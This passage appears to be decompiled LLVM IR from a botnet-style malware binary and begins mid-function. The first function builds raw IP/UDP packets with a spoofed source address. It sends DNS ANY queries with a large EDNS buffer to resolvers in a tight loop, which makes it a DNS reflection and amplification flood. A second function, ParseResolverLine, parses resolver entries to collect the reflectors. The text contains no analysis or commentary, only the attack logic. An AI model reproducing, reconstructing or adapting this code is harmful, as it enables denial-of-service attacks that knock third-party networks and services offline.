  %v1_804982b = icmp eq i1 %v1_8049829, false
  br i1 %v1_804982b, label %dec_label_pc_8049d9f, label %dec_label_pc_8049831

dec_label_pc_8049831:                             ; preds = %entry
  %v1_804984a = add i32 %tmp31, 12
  %v2_804984a = inttoptr i32 %v1_804984a to i32*
  %v3_804984a = load i32, i32* %v2_804984a, align 4
  %v1_8049868 = add i32 %tmp31, 4
  %v2_8049868 = inttoptr i32 %v1_8049868 to i32*
  %v3_8049868 = load i32, i32* %v2_8049868, align 4
  %v1_8049871 = add i32 %tmp31, 24
  %v2_8049871 = inttoptr i32 %v1_8049871 to i32*
  %v3_8049871 = load i32, i32* %v2_8049871, align 4
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-4732, align 4
  %v4_804988e = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_8049896 = icmp slt i32 %v4_804988e, 0
  %v1_804989a = icmp eq i1 %v5_8049896, false
  br i1 %v1_804989a, label %dec_label_pc_80498a8, label %dec_label_pc_804989c

dec_label_pc_804989c:                             ; preds = %dec_label_pc_8049831
  store i8* inttoptr (i32 -1 to i8*), i8** %stack_var_-4732, align 4
  %v2_80498a3 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_80498a8

dec_label_pc_80498a8:                             ; preds = %dec_label_pc_8049831, %dec_label_pc_804989c
  store i8* null, i8** %stack_var_-4732, align 4
  %v3_80498af = call i32 @__GI_time(i32* null)
  %v4_80498b4 = inttoptr i32 %v3_80498af to i8*
  store i8* %v4_80498b4, i8** %stack_var_-4732, align 4
  %v2_80498b7 = call i32 @init_rand(i32 %v3_80498af)
  %v2_80498bc = ptrtoint i32* %stack_var_-4156 to i32
  %tmp38 = bitcast i32* %stack_var_-4156 to i8*
  store i8* %tmp38, i8** %stack_var_-4732, align 4
  %v5_80498d8 = call i32 @__GI_memset(i8* %tmp38, i32 0, i32 4096)
  store i8 69, i8* %tmp38, align 4
  %v1_8049901 = or i32 %v2_80498bc, 1
  %v2_8049901 = inttoptr i32 %v1_8049901 to i8*
  store i8 0, i8* %v2_8049901, align 1
  %v1_8049908 = or i32 %v2_80498bc, 2
  %v2_8049908 = inttoptr i32 %v1_8049908 to i16*
  store i16 58, i16* %v2_8049908, align 2
  store i8* inttoptr (i32 54321 to i8*), i8** %stack_var_-4732, align 4
  %v2_8049915 = call i32 @htonl(i32 54321)
  %v1_804991a = urem i32 %v2_8049915, 65536
  store i32 %v1_804991a, i32* @edx, align 4
  %v1_8049920 = trunc i32 %v2_8049915 to i16
  %v3_8049920 = add i32 %v2_80498bc, 4
  %v4_8049920 = inttoptr i32 %v3_8049920 to i16*
  store i16 %v1_8049920, i16* %v4_8049920, align 4
  %v1_8049927 = add i32 %v2_80498bc, 6
  %v2_8049927 = inttoptr i32 %v1_8049927 to i16*
  store i16 0, i16* %v2_8049927, align 2
  %v1_8049930 = add i32 %v2_80498bc, 8
  %v2_8049930 = inttoptr i32 %v1_8049930 to i8*
  store i8 -1, i8* %v2_8049930, align 4
  %v1_8049937 = add i32 %v2_80498bc, 9
  %v2_8049937 = inttoptr i32 %v1_8049937 to i8*
  store i8 17, i8* %v2_8049937, align 1
  %v1_804993e = add i32 %v2_80498bc, 10
  %v2_804993e = inttoptr i32 %v1_804993e to i16*
  store i16 0, i16* %v2_804993e, align 2
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8069b65.78, i32 0, i32 0), i8** %stack_var_-4732, align 4
  %v2_804994b = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8069b65.78 to i32))
  %v2_8049955 = add i32 %v2_80498bc, 12
  %v3_8049955 = inttoptr i32 %v2_8049955 to i32*
  store i32 %v2_804994b, i32* %v3_8049955, align 4
  %v2_804996c = add i32 %v2_80498bc, 20
  %v5_804996e = inttoptr i32 %v2_804996c to i16*
  %v1_8049974 = urem i32 %v3_8049871, 65536
  %v4_8049977 = inttoptr i32 %v1_8049974 to i8*
  store i8* %v4_8049977, i8** %stack_var_-4732, align 4
  %v2_804997a = trunc i32 %v3_8049871 to i16
  %v3_804997a = call i32 @htons(i16 %v2_804997a)
  %v1_8049985 = trunc i32 %v3_804997a to i16
  store i16 %v1_8049985, i16* %v5_804996e, align 4
  store i8* inttoptr (i32 53 to i8*), i8** %stack_var_-4732, align 4
  %v3_804998f = call i32 @htons(i16 53)
  %v1_804999a = trunc i32 %v3_804998f to i16
  %v3_804999a = add i32 %v2_80498bc, 22
  %v4_804999a = inttoptr i32 %v3_804999a to i16*
  store i16 %v1_804999a, i16* %v4_804999a, align 2
  %v1_80499a1 = add i32 %v2_80498bc, 26
  %v2_80499a1 = inttoptr i32 %v1_80499a1 to i16*
  store i16 0, i16* %v2_80499a1, align 2
  %v2_80499bb = add i32 %v2_80498bc, 28
  %v5_80499bd = inttoptr i32 %v2_80499bb to i16*
  %v1_80499c0 = call i32 @rand_cmwc(i32 28)
  %v1_80499c5 = urem i32 %v1_80499c0, 65536
  %v4_80499c8 = inttoptr i32 %v1_80499c5 to i8*
  store i8* %v4_80499c8, i8** %stack_var_-4732, align 4
  %v2_80499cb = trunc i32 %v1_80499c0 to i16
  %v3_80499cb = call i32 @htons(i16 %v2_80499cb)
  %v1_80499d6 = trunc i32 %v3_80499cb to i16
  store i16 %v1_80499d6, i16* %v5_80499bd, align 4
  %v1_80499dc = add i32 %v2_80498bc, 30
  %v2_80499dc = inttoptr i32 %v1_80499dc to i8*
  store i8 1, i8* %v2_80499dc, align 2
  %v1_8049a18 = add i32 %v2_80498bc, 31
  %v2_8049a18 = inttoptr i32 %v1_8049a18 to i8*
  store i8 0, i8* %v2_8049a18, align 1
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-4732, align 4
  %v3_8049a58 = call i32 @htons(i16 1)
  %v1_8049a63 = trunc i32 %v3_8049a58 to i16
  %v3_8049a63 = add i32 %v2_80498bc, 32
  %v4_8049a63 = inttoptr i32 %v3_8049a63 to i16*
  store i16 %v1_8049a63, i16* %v4_8049a63, align 4
  %v1_8049a6a = add i32 %v2_80498bc, 34
  %v2_8049a6a = inttoptr i32 %v1_8049a6a to i16*
  store i16 0, i16* %v2_8049a6a, align 2
  %v1_8049a73 = add i32 %v2_80498bc, 36
  %v2_8049a73 = inttoptr i32 %v1_8049a73 to i16*
  store i16 0, i16* %v2_8049a73, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-4732, align 4
  %v3_8049a80 = call i32 @htons(i16 1)
  %v1_8049a8b = trunc i32 %v3_8049a80 to i16
  %v3_8049a8b = add i32 %v2_80498bc, 38
  %v4_8049a8b = inttoptr i32 %v3_8049a8b to i16*
  store i16 %v1_8049a8b, i16* %v4_8049a8b, align 2
  store i32 %v3_804984a, i32* %v3_8049955, align 4
  %v1_8049ab4 = add i32 %v3_8049868, 4
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  %v2_8049aba = add i32 %v2_80498bc, 16
  %v3_8049aba = inttoptr i32 %v2_8049aba to i32*
  store i32 %v3_8049ab4, i32* %v3_8049aba, align 4
  %v3_8049ac0 = load i16, i16* %v2_8049908, align 2
  %div = udiv i16 %v3_8049ac0, 2
  %v2_8049ac4 = zext i16 %div to i32
  store i8* %tmp38, i8** %stack_var_-4732, align 4
  %tmp40 = bitcast i32* %stack_var_-4156 to i16*
  %v4_8049ad6 = call i32 @csum(i16* %tmp40, i32 %v2_8049ac4)
  %v1_8049ae1 = trunc i32 %v4_8049ad6 to i16
  store i16 %v1_8049ae1, i16* %v2_804993e, align 2
  %v2_8049b4e = add i32 %v2_80498bc, 40
  %v2_8049b5d = ptrtoint i32* %stack_var_-4684 to i32
  %tmp41 = bitcast i32* %stack_var_-4684 to i8*
  %v4_8049b78 = inttoptr i32 %v2_8049b4e to i8*
  %v3_8049cee = add i32 %v2_80498bc, 24
  %v4_8049cee = inttoptr i32 %v3_8049cee to i16*
  %v4_8049d86 = inttoptr i32 %v4_804988e to i8*
  br label %dec_label_pc_8049af3

dec_label_pc_8049af3:                             ; preds = %dec_label_pc_8049d97, %dec_label_pc_80498a8
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_80498a8 ], [ %v4_8049d97, %dec_label_pc_8049d97 ]
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_80498a8 ], [ %v4_8049cb8, %dec_label_pc_8049d97 ]
  %stack_var_-52.0 = phi i32 [ %v3_8049868, %dec_label_pc_80498a8 ], [ %v3_8049b0f, %dec_label_pc_8049d97 ]
  %v12_8049af3 = icmp eq i32 %stack_var_-24.0, 2
  %v1_8049af7 = icmp eq i1 %v12_8049af3, false
  br i1 %v1_8049af7, label %dec_label_pc_8049b0c, label %dec_label_pc_8049af9

dec_label_pc_8049af9:                             ; preds = %dec_label_pc_8049af3
  store i8* inttoptr (i32 100 to i8*), i8** %stack_var_-4732, align 4
  %v3_8049b00 = call i32 @usleep(i64 100)
  br label %dec_label_pc_8049b0c

dec_label_pc_8049b0c:                             ; preds = %dec_label_pc_8049af3, %dec_label_pc_8049af9
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049af3 ], [ 0, %dec_label_pc_8049af9 ]
  %v1_8049b0f = add i32 %stack_var_-52.0, 532
  %v2_8049b0f = inttoptr i32 %v1_8049b0f to i32*
  %v3_8049b0f = load i32, i32* %v2_8049b0f, align 4
  %v1_8049b1b = add i32 %stack_var_-20.0, 256
  %v5_8049b25 = add i32 %stack_var_-20.0, 40
  %v2_8049b30 = add i32 %v5_8049b25, %v2_80498bc
  %v1_8049b32 = inttoptr i32 %v2_8049b30 to i8*
  store i32 %v2_8049b30, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8049b35 = and i32 %v2_8049b30, -256
  %v5_8049b37 = call i8* @_memset(i8* %v1_8049b32, i32 %v1_8049b35, i32 %v1_8049b1b)
  %v1_8049b56 = add i32 %v3_8049b0f, 16
  store i32 %v2_8049b5d, i32* @eax, align 4
  store i8* %tmp41, i8** %stack_var_-4732, align 4
  %v4_8049b66 = call i32 @strcpy(i8* %tmp41, i32 %v1_8049b56)
  store i8* %v4_8049b78, i8** %stack_var_-4732, align 4
  %v4_8049b7b = call i32 @ChangetoDnsNameFormat(i8* %v4_8049b78, i32 %v2_8049b5d)
  store i1 false, i1* @df, align 1
  store i32 %v2_8049b4e, i32* @edi, align 4
  %v3_8049b97 = call i32 @_strlen(i8* %v4_8049b78)
  %v5_8049bad = add i32 %v3_8049b97, 41
  %v2_8049bb8 = add i32 %v5_8049bad, %v2_80498bc
  %v5_8049bba = inttoptr i32 %v2_8049bb8 to i16*
  store i8* inttoptr (i32 255 to i8*), i8** %stack_var_-4732, align 4
  %v3_8049bc4 = call i32 @htons(i16 255)
  %v1_8049bcf = trunc i32 %v3_8049bc4 to i16
  store i16 %v1_8049bcf, i16* %v5_8049bba, align 2
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-4732, align 4
  %v3_8049bd9 = call i32 @htons(i16 1)
  %v1_8049be4 = trunc i32 %v3_8049bd9 to i16
  %v3_8049be4 = add i32 %v2_8049bb8, 2
  %v4_8049be4 = inttoptr i32 %v3_8049be4 to i16*
  store i16 %v1_8049be4, i16* %v4_8049be4, align 2
  %v0_8049bf7 = load i32, i32* @ebp, align 4
  %v2_8049bf7 = add i32 %v3_8049b97, -4107
  %v3_8049bf7 = add i32 %v2_8049bf7, %v0_8049bf7
  %v4_8049bf7 = inttoptr i32 %v3_8049bf7 to i8*
  store i8 0, i8* %v4_8049bf7, align 1
  %v0_8049c06 = load i32, i32* @ebp, align 4
  %v2_8049c06 = add i32 %v3_8049b97, -4106
  %v3_8049c06 = add i32 %v2_8049c06, %v0_8049c06
  %v4_8049c06 = inttoptr i32 %v3_8049c06 to i8*
  store i8 0, i8* %v4_8049c06, align 1
  %v0_8049c17 = load i32, i32* @ebp, align 4
  %v2_8049c17 = add i32 %v3_8049b97, -4105
  %v3_8049c17 = add i32 %v2_8049c17, %v0_8049c17
  %v4_8049c17 = inttoptr i32 %v3_8049c17 to i8*
  store i8 41, i8* %v4_8049c17, align 1
  %v0_8049c28 = load i32, i32* @ebp, align 4
  %v2_8049c28 = add i32 %v3_8049b97, -4104
  %v3_8049c28 = add i32 %v2_8049c28, %v0_8049c28
  %v4_8049c28 = inttoptr i32 %v3_8049c28 to i8*
  store i8 35, i8* %v4_8049c28, align 1
  %v0_8049c39 = load i32, i32* @ebp, align 4
  %v2_8049c39 = add i32 %v3_8049b97, -4103
  %v3_8049c39 = add i32 %v2_8049c39, %v0_8049c39
  %v4_8049c39 = inttoptr i32 %v3_8049c39 to i8*
  store i8 40, i8* %v4_8049c39, align 1
  %v0_8049c4a = load i32, i32* @ebp, align 4
  %v2_8049c4a = add i32 %v3_8049b97, -4102
  %v3_8049c4a = add i32 %v2_8049c4a, %v0_8049c4a
  %v4_8049c4a = inttoptr i32 %v3_8049c4a to i8*
  store i8 0, i8* %v4_8049c4a, align 1
  %v0_8049c5b = load i32, i32* @ebp, align 4
  %v2_8049c5b = add i32 %v3_8049b97, -4101
  %v3_8049c5b = add i32 %v2_8049c5b, %v0_8049c5b
  %v4_8049c5b = inttoptr i32 %v3_8049c5b to i8*
  store i8 0, i8* %v4_8049c5b, align 1
  %v0_8049c6c = load i32, i32* @ebp, align 4
  %v2_8049c6c = add i32 %v3_8049b97, -4100
  %v3_8049c6c = add i32 %v2_8049c6c, %v0_8049c6c
  %v4_8049c6c = inttoptr i32 %v3_8049c6c to i8*
  store i8 0, i8* %v4_8049c6c, align 1
  %v0_8049c7d = load i32, i32* @ebp, align 4
  %v2_8049c7d = add i32 %v3_8049b97, -4099
  %v3_8049c7d = add i32 %v2_8049c7d, %v0_8049c7d
  %v4_8049c7d = inttoptr i32 %v3_8049c7d to i8*
  store i8 0, i8* %v4_8049c7d, align 1
  %v0_8049c8e = load i32, i32* @ebp, align 4
  %v2_8049c8e = add i32 %v3_8049b97, -4098
  %v3_8049c8e = add i32 %v2_8049c8e, %v0_8049c8e
  %v4_8049c8e = inttoptr i32 %v3_8049c8e to i8*
  store i8 0, i8* %v4_8049c8e, align 1
  %v0_8049c9f = load i32, i32* @ebp, align 4
  %v2_8049c9f = add i32 %v3_8049b97, -4097
  %v3_8049c9f = add i32 %v2_8049c9f, %v0_8049c9f
  %v4_8049c9f = inttoptr i32 %v3_8049c9f to i8*
  store i8 0, i8* %v4_8049c9f, align 1
  %v1_8049cad = add i32 %v3_8049b97, 56
  %v0_8049cb0 = load i32, i32* @ebp, align 4
  %v2_8049cb0 = add i32 %v3_8049b97, -4096
  %v3_8049cb0 = add i32 %v2_8049cb0, %v0_8049cb0
  %v4_8049cb0 = inttoptr i32 %v3_8049cb0 to i8*
  store i8 0, i8* %v4_8049cb0, align 1
  %v1_8049cbf = add i32 %v3_8049b0f, 4
  %v2_8049cbf = inttoptr i32 %v1_8049cbf to i32*
  %v3_8049cbf = load i32, i32* %v2_8049cbf, align 4
  store i32 %v3_8049cbf, i32* %v3_8049aba, align 4
  %fold6 = add i32 %v3_8049b97, 65572
  %v1_8049cdd = urem i32 %fold6, 65536
  %v4_8049ce0 = inttoptr i32 %v1_8049cdd to i8*
  store i8* %v4_8049ce0, i8** %stack_var_-4732, align 4
  %v2_8049ce3 = trunc i32 %fold6 to i16
  %v3_8049ce3 = call i32 @htons(i16 %v2_8049ce3)
  %v1_8049cee = trunc i32 %v3_8049ce3 to i16
  store i16 %v1_8049cee, i16* %v4_8049cee, align 4
  %v1_8049d07 = trunc i32 %v1_8049cad to i16
  store i16 %v1_8049d07, i16* %v2_8049908, align 2
  %v0_8049d0b = load i8*, i8** %stack_var_-4732, align 4
  %v1_8049d0b = ptrtoint i8* %v0_8049d0b to i32
  %v2_8049d0b = call i32 @rand_cmwc(i32 %v1_8049d0b)
  %v1_8049d10 = urem i32 %v2_8049d0b, 65536
  %v4_8049d13 = inttoptr i32 %v1_8049d10 to i8*
  store i8* %v4_8049d13, i8** %stack_var_-4732, align 4
  %v2_8049d16 = trunc i32 %v2_8049d0b to i16
  %v3_8049d16 = call i32 @htons(i16 %v2_8049d16)
  %v1_8049d21 = trunc i32 %v3_8049d16 to i16
  store i16 %v1_8049d21, i16* %v5_804996e, align 4
  %v3_8049d27 = load i16, i16* %v2_8049908, align 2
  %div43 = udiv i16 %v3_8049d27, 2
  %v2_8049d2b = zext i16 %div43 to i32
  store i8* %tmp38, i8** %stack_var_-4732, align 4
  %v4_8049d3d = call i32 @csum(i16* %tmp40, i32 %v2_8049d2b)
  %v1_8049d48 = trunc i32 %v4_8049d3d to i16
  store i16 %v1_8049d48, i16* %v2_804993e, align 2
  br label %dec_label_pc_8049d55

dec_label_pc_8049d55:                             ; preds = %dec_label_pc_8049b0c, %dec_label_pc_8049d55
  %storemerge42 = phi i32 [ 0, %dec_label_pc_8049b0c ], [ %v4_8049d8e, %dec_label_pc_8049d55 ]
  %v3_8049d5d = load i16, i16* %v2_8049908, align 2
  %v4_8049d5d = zext i16 %v3_8049d5d to i32
  store i8* %v4_8049d86, i8** %stack_var_-4732, align 4
  %v7_8049d89 = call i32 @sendto(i32 %v4_804988e, i32 %v2_80498bc, i32 %v4_8049d5d, i32 0, i32 %v3_8049b0f, i32 16)
  %v4_8049d8e = add nuw nsw i32 %storemerge42, 1
  %exitcond = icmp eq i32 %v4_8049d8e, 25
  br i1 %exitcond, label %dec_label_pc_8049d97, label %dec_label_pc_8049d55

dec_label_pc_8049d97:                             ; preds = %dec_label_pc_8049d55
  %v4_8049cb8 = add i32 %v3_8049b97, 16
  %v4_8049d97 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_8049af3

dec_label_pc_8049d9f:                             ; preds = %entry
  %v2_8049da5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049da5, i32* @edi, align 4
  ret i32 %v1_8049824

; uselistorder directives
  uselistorder i32 %v2_8049d0b, { 1, 0 }
  uselistorder i32 %fold6, { 1, 0 }
  uselistorder i32 %v3_8049b0f, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-24.0, { 1, 0 }
  uselistorder i32 %v2_8049b4e, { 1, 0 }
  uselistorder i32 %v1_80499c0, { 1, 0 }
  uselistorder i32 %v2_8049915, { 1, 0 }
  uselistorder i8* %tmp38, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80498bc, { 23, 0, 1, 11, 12, 2, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %v4_804988e, { 1, 0, 2 }
  uselistorder i32 %v3_8049871, { 1, 0 }
  uselistorder i8** %stack_var_-4732, { 21, 20, 19, 22, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049d55, { 1, 0 }
  uselistorder label %dec_label_pc_8049b0c, { 1, 0 }
  uselistorder label %dec_label_pc_80498a8, { 1, 0 }
}

define i32 @ParseResolverLine(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-768 = alloca i32, align 4
  %stack_var_-568 = alloca i8, align 1
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-1079 = alloca i32, align 4
  %stack_var_-567 = alloca i32, align 4
  %stack_var_-55 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049dab = load i32, i32* @edi, align 4
  %v0_8049dac = load i32, i32* @ebx, align 4
  store i32 %v0_8049dac, i32* %stack_var_-12, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v2_8049dbd = ptrtoint i32* %stack_var_-55 to i32
  %tmp25 = bitcast i32* %stack_var_-55 to i8*
  store i32 %v2_8049dbd, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_8049dc8 = call i8* @_memset(i8* %tmp25, i32 0, i32 31)
  store i8 0, i8* %stack_var_-568, align 1
  %v2_8049dd7 = ptrtoint i32* %stack_var_-567 to i32
  store i32 %v2_8049dd7, i32* %edx.global-to-local, align 4
  store i32 511, i32* %eax.global-to-local, align 4
  %v3_8049df1 = bitcast i32* %stack_var_-567 to i8*
  %v4_8049df1 = call i32 @__GI_memset(i8* %v3_8049df1, i32 0, i32 511)
  %v2_8049e03 = ptrtoint i32* %stack_var_-1079 to i32
  store i32 %v2_8049e03, i32* %edx.global-to-local, align 4
  store i32 511, i32* %eax.global-to-local, align 4
  %v3_8049e1d = bitcast i32* %stack_var_-1079 to i8*
  %v4_8049e1d = call i32 @__GI_memset(i8* %v3_8049e1d, i32 0, i32 511)
  store i32 %v4_8049e1d, i32* %eax.global-to-local, align 4
  %v4_8049ed5 = ptrtoint i8* %arg1 to i32
  %v1_8049ee3 = and i32 %v4_8049ed5, -256
  %v2_8049e9c = ptrtoint i8* %stack_var_-568 to i32
  %v2_8049ead = ptrtoint i32* %stack_var_-768 to i32
  %v2_8049e67 = ptrtoint i8* %stack_var_-56 to i32
  %v2_8049e75 = ptrtoint i32* %stack_var_-256 to i32
  br label %dec_label_pc_8049ed2

dec_label_pc_8049e35:                             ; preds = %dec_label_pc_8049ed2
  %v6_8049e38 = add i32 %storemerge, %v4_8049ed5
  store i32 %v6_8049e38, i32* %eax.global-to-local, align 4
  %v1_8049e3b = inttoptr i32 %v6_8049e38 to i8*
  %v2_8049e3b = load i8, i8* %v1_8049e3b, align 1
  %v3_8049e3b = zext i8 %v2_8049e3b to i32
  store i32 %v3_8049e3b, i32* %eax.global-to-local, align 4
  %v7_8049e3e = icmp eq i8 %v2_8049e3b, 32
  br i1 %v7_8049e3e, label %dec_label_pc_8049e5c, label %dec_label_pc_8049e42

dec_label_pc_8049e42:                             ; preds = %dec_label_pc_8049e35
  store i32 %v6_8049e38, i32* %eax.global-to-local, align 4
  %v2_8049e48 = load i8, i8* %v1_8049e3b, align 1
  %v3_8049e48 = zext i8 %v2_8049e48 to i32
  store i32 %v3_8049e48, i32* %eax.global-to-local, align 4
  %v10_8049e4b = icmp eq i8 %v2_8049e48, 10
  br i1 %v10_8049e4b, label %dec_label_pc_8049e5c, label %dec_label_pc_8049e4f

dec_label_pc_8049e4f:                             ; preds = %dec_label_pc_8049e42
  store i32 %v6_8049e38, i32* %eax.global-to-local, align 4
  %v2_8049e55 = load i8, i8* %v1_8049e3b, align 1
  %v3_8049e55 = zext i8 %v2_8049e55 to i32
  store i32 %v3_8049e55, i32* %eax.global-to-local, align 4
  %v10_8049e58 = icmp eq i8 %v2_8049e55, 9
  %v1_8049e5a = icmp eq i1 %v10_8049e58, false
  br i1 %v1_8049e5a, label %dec_label_pc_8049e61, label %dec_label_pc_8049e5c

dec_label_pc_8049e5c:                             ; preds = %dec_label_pc_8049e4f, %dec_label_pc_8049e42, %dec_label_pc_8049e35
  %v4_8049e5c = add i32 %stack_var_-20.1, 1
  br label %dec_label_pc_8049ecf

dec_label_pc_8049e61:                             ; preds = %dec_label_pc_8049e4f
  %v4_8049e61 = icmp eq i32 %stack_var_-20.1, 0
  %v1_8049e65 = icmp eq i1 %v4_8049e61, false
  br i1 %v1_8049e65, label %dec_label_pc_8049e96, label %dec_label_pc_8049e67

dec_label_pc_8049e67:                             ; preds = %dec_label_pc_8049e61
  store i32 %v2_8049e75, i32* %eax.global-to-local, align 4
  %v3_8049e7e = call i32 @_strlen(i8* nonnull %stack_var_-56)
  %v4_8049e7e = mul i32 %v3_8049e7e, -1
  %v1_8049e84 = sub i32 0, %v4_8049e7e
  store i32 %v1_8049e84, i32* %edx.global-to-local, align 4
  store i32 %v6_8049e38, i32* %eax.global-to-local, align 4
  %v2_8049e8d = load i8, i8* %v1_8049e3b, align 1
  %v3_8049e8d = zext i8 %v2_8049e8d to i32
  store i32 %v3_8049e8d, i32* %eax.global-to-local, align 4
  %v2_8049e90 = load i32, i32* @ebp, align 4
  %v4_8049e90 = sub i32 -52, %v4_8049e7e
  %v5_8049e90 = add i32 %v4_8049e90, %v2_8049e90
  %v6_8049e90 = inttoptr i32 %v5_8049e90 to i8*
  store i8 %v2_8049e8d, i8* %v6_8049e90, align 1
  br label %dec_label_pc_8049ecf

dec_label_pc_8049e96:                             ; preds = %dec_label_pc_8049e61
  %v12_8049e96 = icmp eq i32 %stack_var_-20.1, 1
  %v1_8049e9a = icmp eq i1 %v12_8049e96, false
  br i1 %v1_8049e9a, label %dec_label_pc_8049ecf, label %dec_label_pc_8049e9c

dec_label_pc_8049e9c:                             ; preds = %dec_label_pc_8049e96
  store i32 %v2_8049ead, i32* %eax.global-to-local, align 4
  %v3_8049eb6 = call i32 @_strlen(i8* nonnull %stack_var_-568)
  %v4_8049eb6 = mul i32 %v3_8049eb6, -1
  %v1_8049ebc = sub i32 0, %v4_8049eb6
  store i32 %v1_8049ebc, i32* %edx.global-to-local, align 4
  store i32 %v6_8049e38, i32* %eax.global-to-local, align 4
  %v2_8049ec5 = load i8, i8* %v1_8049e3b, align 1
  %v3_8049ec5 = zext i8 %v2_8049ec5 to i32
  store i32 %v3_8049ec5, i32* %eax.global-to-local, align 4
  %v2_8049ec8 = load i32, i32* @ebp, align 4
  %v4_8049ec8 = sub i32 -564, %v4_8049eb6
  %v5_8049ec8 = add i32 %v4_8049ec8, %v2_8049ec8
  %v6_8049ec8 = inttoptr i32 %v5_8049ec8 to i8*
  store i8 %v2_8049ec5, i8* %v6_8049ec8, align 1
  br label %dec_label_pc_8049ecf

dec_label_pc_8049ecf:                             ; preds = %dec_label_pc_8049e96, %dec_label_pc_8049e67, %dec_label_pc_8049e5c, %dec_label_pc_8049e9c
  %stack_var_-20.0 = phi i32 [ %v4_8049e5c, %dec_label_pc_8049e5c ], [ %stack_var_-20.1, %dec_label_pc_8049e96 ], [ %stack_var_-20.1, %dec_label_pc_8049e9c ], [ %stack_var_-20.1, %dec_label_pc_8049e67 ]
  %v4_8049ecf = add i32 %storemerge, 1
  br label %dec_label_pc_8049ed2

dec_label_pc_8049ed2:                             ; preds = %entry, %dec_label_pc_8049ecf
  %stack_var_-20.1 = phi i32 [ 0, %entry ], [ %stack_var_-20.0, %dec_label_pc_8049ecf ]
  %storemerge = phi i32 [ 0, %entry ], [ %v4_8049ecf, %dec_label_pc_8049ecf ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  store i32 %v1_8049ee3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8049ed5, i32* @edi, align 4
  %v3_8049eec = call i32 @_strlen(i8* %arg1)
  %v4_8049eec = mul i32 %v3_8049eec, -1
  %v5_8049eec = add i32 %v4_8049eec, -2
  store i32 %v5_8049eec, i32* @ecx, align 4
  %v1_8049ef2 = sub i32 0, %v4_8049eec
  store i32 %v1_8049ef2, i32* %eax.global-to-local, align 4
  %v0_8049ef3 = load i32, i32* %edx.global-to-local, align 4
  %v7_8049ef3 = icmp ult i32 %v0_8049ef3, %v1_8049ef2
  br i1 %v7_8049ef3, label %dec_label_pc_8049e35, label %dec_label_pc_8049efb

dec_label_pc_8049efb:                             ; preds = %dec_label_pc_8049ed2
  %v0_8049efb = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_8049efb, i32* %eax.global-to-local, align 4
  %v1_8049f00 = icmp eq i32 %v0_8049efb, 0
  %v1_8049f02 = icmp eq i1 %v1_8049f00, false
  %v1_8049fbd = call i32 @malloc(i32 540)
  store i32 %v1_8049fbd, i32* %eax.global-to-local, align 4
  br i1 %v1_8049f02, label %dec_label_pc_8049fb6, label %dec_label_pc_8049f08

dec_label_pc_8049f08:                             ; preds = %dec_label_pc_8049efb
  store i32 %v1_8049fbd, i32* @global_var_807f300.80, align 256
  store i32 %v1_8049fbd, i32* %eax.global-to-local, align 4
  %v1_8049f1e = inttoptr i32 %v1_8049fbd to i32*
  store i32 0, i32* %v1_8049f1e, align 4
  %v0_8049f24 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049f24 = add i32 %v0_8049f24, 4
  %v2_8049f24 = inttoptr i32 %v1_8049f24 to i32*
  store i32 0, i32* %v2_8049f24, align 4
  %v0_8049f2b = load i32, i32* %eax.global-to-local, align 4
  %v1_8049f2b = add i32 %v0_8049f2b, 8
  %v2_8049f2b = inttoptr i32 %v1_8049f2b to i32*
  store i32 0, i32* %v2_8049f2b, align 4
  %v0_8049f32 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049f32 = add i32 %v0_8049f32, 12
  %v2_8049f32 = inttoptr i32 %v1_8049f32 to i32*
  store i32 0, i32* %v2_8049f32, align 4
  %v0_8049f39 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_8049f39, i32* @ebx, align 4
  store i32 %v2_8049e67, i32* %eax.global-to-local, align 4
  %v1_8049f45 = call i32 @inet_addr(i32 %v2_8049e67)
  store i32 %v1_8049f45, i32* %eax.global-to-local, align 4
  %v1_8049f4a = load i32, i32* @ebx, align 4
  %v2_8049f4a = add i32 %v1_8049f4a, 4
  %v3_8049f4a = inttoptr i32 %v2_8049f4a to i32*
  store i32 %v1_8049f45, i32* %v3_8049f4a, align 4
  %v0_8049f4d = load i32, i32* @global_var_807f300.80, align 256
  %v2_8049f5a = call i32 @htons(i16 53)
  %v1_8049f62 = trunc i32 %v2_8049f5a to i16
  %v3_8049f62 = add i32 %v0_8049f4d, 2
  %v4_8049f62 = inttoptr i32 %v3_8049f62 to i16*
  store i16 %v1_8049f62, i16* %v4_8049f62, align 2
  %v0_8049f66 = load i32, i32* @global_var_807f300.80, align 256
  %v1_8049f6b = add i32 %v0_8049f66, 16
